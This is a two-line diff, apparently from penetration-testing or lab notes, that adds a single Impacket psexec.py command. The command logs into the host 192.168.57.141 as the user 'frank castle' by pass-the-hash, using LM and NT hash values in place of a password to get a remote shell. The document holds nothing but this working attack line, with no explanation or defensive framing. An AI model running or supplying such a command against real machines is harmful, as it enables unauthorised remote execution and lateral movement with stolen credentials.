@@ -1,0 +1,2 @@
+
+psexec.py "frank castle":@192.168.57.141 -hashes aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3
